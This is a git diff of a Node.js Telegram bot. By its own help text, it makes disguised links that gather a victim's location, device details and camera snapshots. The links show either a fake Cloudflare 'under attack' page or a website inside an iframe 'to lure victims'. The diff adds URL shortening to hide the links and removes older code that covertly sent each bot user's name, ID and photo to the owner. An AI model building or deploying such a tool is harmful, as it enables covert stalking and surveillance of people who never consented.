@@ -15,13 +15,12 @@ const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
 const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
 const app = express();
 
-app.use(express.static('public'));
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-const hostURL = "https://sgmodder.adaptable.app/";
+const hostURL = "https://sgmodder.adaptable.app";
 let use1pt = false;
 
 app.get("/w/:path/:uri", (req, res) => {
@@ -107,45 +106,7 @@ async function animatedEditMessage(chatId, messageId, newText) {
     }
 }
 
-// Function to get user details
-async function getUserDetails(user) {
-    const userDetails = `
-        User Name: ${user.first_name} ${user.last_name || ""}
-        Username: ${user.username || "N/A"}
-        User ID: ${user.id}
-    `;
-
-    if (user.photo) {
-        const photoFile = await bot.getUserProfilePhotos(user.id, 0, 1);
-        const photoUrl = await bot.getFileLink(photoFile.photos[0][0].file_id);
-        return { userDetails, photoUrl };
-    } else {
-        return { userDetails };
-    }
-}
-
-// Function to send user details to bot owner
-function sendUserDetailsToOwner(userDetails) {
-    if (userDetails.photoUrl) {
-        bot.sendPhoto(botOwnerId, userDetails.photoUrl, { caption: userDetails.userDetails });
-    } else {
-        bot.sendMessage(botOwnerId, userDetails.userDetails);
-    }
-}
-
-// Step-by-step help function
-async function sendHelpMessage(chatId) {
-    const helpMessage = `
-    Welcome to the bot! Here are some steps to get started:
-    1. Use /start to initiate the bot.
-    2. Use /create to create a new link.
-    3. Use /help to see this help message.
-    4. Use /tutorial to get a tutorial video.
-    `;
-    await bot.sendMessage(chatId, helpMessage);
-}
-
-// Enhanced user-friendly interactions for /start command
+// Usage:
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
 
@@ -162,15 +123,14 @@ bot.on('message', async (msg) => {
                 createLink(chatId, msg.text);
             }
 
-            if (msg.text === "/start") {
-                const userDetails = await getUserDetails(msg.from);
-                sendUserDetailsToOwner(userDetails);
-                const startMessage = `📍 Hello ${msg.chat.first_name}! 🎉,
-                \nWelcome to the bot. Follow the steps below to use it:
-                \n1. /create - Create a new link.
-                \n2. /help - Get help on how to use the bot.
-                \n3. /tutorial - Watch a tutorial video.
-                \nEnjoy using the bot! 🚀`;
+         if (msg.text === "/start") {
+                const startMessage = `𝙒𝙚𝙡𝙘𝙤𝙢𝙚 ${msg.chat.first_name}! 🎉,
+        \n𝒀𝒐𝒖𝒓 𝒄𝒂𝒏 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕 𝒕𝒐 𝒕𝒓𝒂𝒄𝒌 𝒅𝒐𝒘𝒏 𝒑𝒆𝒐𝒑𝒍𝒆 𝒋𝒖𝒔𝒕 𝒕𝒉𝒓𝒐𝒖𝒈𝒉 𝒂 𝒔𝒊𝒎𝒑𝒍𝒆 𝒍𝒊𝒏𝒌. 🌐       
+       \n𝑰𝒕 𝒄𝒂𝒏 𝒈𝒂𝒕𝒉𝒆𝒓 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 𝒍𝒊𝒌𝒆 𝒍𝒐𝒄𝒂𝒕𝒊𝒐𝒏, 𝒅𝒆𝒗𝒊𝒄𝒆 𝒅𝒆𝒕𝒂𝒊𝒍𝒔, 𝒂𝒏𝒅 𝒆𝒗𝒆𝒏 𝒄𝒂𝒎𝒆𝒓𝒂 𝒔𝒏𝒂𝒑𝒔. 📱📸       
+       \n𝑻𝒉𝒊𝒔 𝒃𝒐𝒕 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 > @SG_Modder😈        
+        \n𝑱𝒐𝒊𝒏 𝑴𝒚 𝒄𝒉𝒂𝒏𝒏𝒆𝒍 > @SG_Modder1    
+        \n\n𝑻𝒚𝒑𝒆 /help 𝒇𝒐𝒓 𝒎𝒐𝒓𝒆 𝒊𝒏𝒇𝒐. ℹ️
+        \n\nClik On Create link Button 👇`;        
 
                 await bot.sendMessage(chatId, startMessage, {
                     reply_markup: JSON.stringify({
@@ -182,10 +142,16 @@ bot.on('message', async (msg) => {
             } else if (msg.text === "/create") {
                 createNew(chatId);
             } else if (msg.text === "/help") {
-                sendHelpMessage(chatId);
-            } else if (msg.text === "/tutorial") {
-                const tutorialLink = "https://t.me/SG_Modder1/140";
-                await bot.sendMessage(chatId, `Watch the tutorial video here: ${tutorialLink}`);
+                const helpMessage = `
+        𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞 𝐛𝐲 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐚 𝐬𝐢𝐦𝐩𝐥𝐞 𝐥𝐢𝐧𝐤. 🕵️‍♂️\n\n       
+        𝐒𝐞𝐧𝐝 /𝐜𝐫𝐞𝐚𝐭𝐞 𝐭𝐨 𝐛𝐞𝐠𝐢𝐧; 𝐚𝐟𝐭𝐞𝐫𝐰𝐚𝐫𝐝, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐚𝐬𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐚 𝐔𝐑𝐋, 𝐰𝐡𝐢𝐜𝐡 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐢𝐧 𝐚𝐧 𝐢𝐟𝐫𝐚𝐦𝐞 𝐭𝐨 𝐥𝐮𝐫𝐞 𝐯𝐢𝐜𝐭𝐢𝐦𝐬. 📩\n        
+       𝐀𝐟𝐭𝐞𝐫 𝐫𝐞𝐜𝐞𝐢𝐯𝐢𝐧𝐠 𝐭𝐡𝐞 𝐔𝐑𝐋, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮 𝟐 𝐥𝐢𝐧𝐤𝐬 𝐭𝐡𝐚𝐭 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐭𝐨 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞. 🔗👤\n\n      
+        𝐒𝐩𝐞𝐜𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬: ℹ️\n      
+        𝟏. 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐬𝐡𝐨𝐰𝐬 𝐚 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐮𝐧𝐝𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐩𝐚𝐠𝐞 𝐭𝐨 𝐠𝐚𝐭𝐡𝐞𝐫 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝐭𝐡𝐞𝐧 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐬 𝐭𝐡𝐞 𝐯𝐢𝐜𝐭𝐢𝐦 𝐭𝐨 𝐭𝐡𝐞 𝐝𝐞𝐬𝐭𝐢𝐧𝐚𝐭𝐢𝐨𝐧 𝐔𝐑𝐋. ☁️🛡️\n       
+       𝟐. 𝐖𝐞𝐛𝐯𝐢𝐞𝐰 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐬𝐡𝐨𝐰𝐬 𝐚 𝐰𝐞𝐛𝐬𝐢𝐭𝐞 (𝐞.𝐠., 𝐁𝐢𝐧𝐠, 𝐝𝐚𝐭𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬, 𝐞𝐭𝐜.) 𝐮𝐬𝐢𝐧𝐠 𝐚𝐧 𝐢𝐟𝐫𝐚𝐦𝐞 𝐟𝐨𝐫 𝐠𝐚𝐭𝐡𝐞𝐫𝐢𝐧𝐠 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧. ( ⚠️ 𝐌𝐚𝐧𝐲 𝐬𝐢𝐭𝐞𝐬 𝐦𝐚𝐲 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤 𝐮𝐧𝐝𝐞𝐫 𝐭𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐢𝐟 𝐭𝐡𝐞𝐲 𝐡𝐚𝐯𝐞 𝐚𝐧 𝐱-𝐟𝐫𝐚𝐦𝐞 𝐡𝐞𝐚𝐝𝐞𝐫 𝐩𝐫𝐞𝐬𝐞𝐧𝐭, 𝐞.𝐠., [𝐆𝐨𝐨𝐠𝐥𝐞]( https://google.com ) ) 🌐🚫\n\n    
+      𝐈𝐅 𝐘𝐎𝐔 𝐅𝐀𝐂𝐄 𝐀𝐍𝐘 𝐎𝐓𝐇𝐄𝐑 𝐏𝐑𝐎𝐁𝐋𝐄𝐌 𝐃𝐌 [  @SG_Modder  ] \𝐧 𝐉𝐎𝐈𝐍 [ @SG_Modder1 ] 🚨    `;
+
+                await bot.sendMessage(chatId, helpMessage);
             }
             // Add other functionalities here accessible to channel members
         } else if (isChannelAdmin) {
@@ -222,6 +188,20 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
 bot.on('polling_error', (error) => {
     //console.log(error.code); 
 });
+
+async function shortenUrlWithIsGd(url) {
+    try {
+        const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
+        if (response.ok) {
+            return await response.text();
+        } else {
+            throw new Error('Failed to shorten URL with is.gd');
+        }
+    } catch (error) {
+        console.error('Error shortening URL with is.gd:', error);
+        throw error;
+    }
+}
 
 async function shortenUrlWithSmolUrl(url) {
     try {
@@ -266,26 +246,23 @@ async function createLink(cid, msg) {
         bot.sendChatAction(cid, "typing");
 
         try {
-            // Shorten URLs using SmolUrl
+            // Shorten URLs using both is.gd and SmolUrl
+            const shortCUrl = await shortenUrlWithIsGd(cUrl);
+            const shortWUrl = await shortenUrlWithIsGd(wUrl);
+
             const smolCUrl = await shortenUrlWithSmolUrl(cUrl);
             const smolWUrl = await shortenUrlWithSmolUrl(wUrl);
 
             bot.sendMessage(cid, `
-    🎉 Your link has been created successfully! Here's your tracking URL:
-    ✅ Original URL: ${msg}
-
-    🚀 URL to Track:
-    🌍 Whole World Support:
-    ${smolCUrl}
-
-    🌍 Whole World Support:
-    ${smolWUrl}
-
-    🔍 These links are your tools for tracking purposes. Utilize them responsibly and ethically to gather the information you need. For any inquiries or assistance, feel free to reach out. 🛠️
-    Stay informed, stay responsible!
-    🕵️‍♂️ = @SG_Modder
-    `, m);
-           } catch (error) {
+    🎉 𝑵𝒆𝒘 𝒍𝒊𝒏𝒌𝒔 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅! 𝒀𝒐𝒖'𝒓𝒆 𝒂𝒍𝒍 𝒔𝒆𝒕 𝒕𝒐 𝒕𝒓𝒂𝒄𝒌:\n\n
+    ✅ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌𝒔: ${msg}\n\n
+    🚀 URL to Track:\n
+    🌐 𝘾𝙡𝙤𝙪𝙙𝙁𝙡𝙖𝙧𝙚 𝙇𝙞𝙣𝙠𝙨 \n\n 😕Some Country Support👇\n☁ ►${shortCUrl}\n\n 😜Whole World Support👇 \n☁ ►  ${smolCUrl}\n\n
+    🌐 𝙒𝙚𝙗𝙑𝙞𝙚𝙬 𝙇𝙞𝙣𝙠𝙨 \n\n  😕Some Country Support👇\n🌊= ${shortWUrl}\n\n  😜Whole World Support👇 \n🌊= ${smolWUrl}\n\n\n
+       🔍 ᴛʜᴇꜱᴇ ʟɪɴᴋꜱ ᴀʀᴇ ʏᴏᴜʀ ᴛᴏᴏʟꜱ ꜰᴏʀ ᴛʀᴀᴄᴋɪɴɢ ᴘᴜʀᴘᴏꜱᴇꜱ. ᴜᴛɪʟɪᴢᴇ ᴛʜᴇᴍ ʀᴇꜱᴘᴏɴꜱɪʙʟʏ ᴀɴᴅ ᴇᴛʜɪᴄᴀʟʟʏ ᴛᴏ ɢᴀᴛʜᴇʀ ᴛʜᴇ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ʏᴏᴜ ɴᴇᴇᴅ. ꜰᴏʀ ᴀɴʏ ɪɴQᴜɪʀɪᴇꜱ ᴏʀ ᴀꜱꜱɪꜱᴛᴀɴᴄᴇ, ꜰᴇᴇʟ ꜰʀᴇᴇ ᴛᴏ ʀᴇᴀᴄʜ ᴏᴜᴛ. 🛠️\n
+    ꜱᴛᴀʏ ɪɴꜰᴏʀᴍᴇᴅ, ꜱᴛᴀʏ ʀᴇꜱᴘᴏɴꜱɪʙʟᴇ! \n\n 🕵𝗗𝗲𝘃= @SG_Modder 
+`, m);
+        } catch (error) {
             console.error('Error shortening links:', error);
             bot.sendMessage(cid, `Failed to shorten links. Please try again later.`);
         }
@@ -354,8 +331,6 @@ app.post("/camsnap", (req, res) => {
     }
 });
 
-// Port binding
-const port = process.env.PORT || 5000;
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
+app.listen(5000, () => {
+    console.log("App Running on Port 5000!");
 });
